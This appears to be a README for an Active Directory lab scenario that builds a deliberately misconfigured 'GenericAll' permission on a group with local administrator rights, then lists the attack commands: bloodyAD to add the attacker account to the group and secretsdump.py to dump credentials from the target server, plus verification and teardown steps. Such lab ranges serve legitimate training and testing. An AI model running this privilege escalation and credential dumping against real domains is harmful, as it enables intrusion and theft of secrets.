# acl-genericall-group

Creates `scn-acl-gag-attacker` (password `Aa1234567890!`) and the domain-local group `scn-acl-gag-group`, makes the group a member of the local `Administrators` group of the target member server, and gives the attacker `GenericAll` on the group.

Attack:

    bloodyAD -d <domain> -u scn-acl-gag-attacker -p 'Aa1234567890!' --host <dc ip> add groupMember scn-acl-gag-group scn-acl-gag-attacker
    # log on again (new token), then
    secretsdump.py <domain>/scn-acl-gag-attacker:'Aa1234567890!'@<host ip>

How to verify:

    net localgroup Administrators   # on the target: lists <NB>\scn-acl-gag-group

Disable removes the group from the local `Administrators` group by SID, then deletes the group and the user.
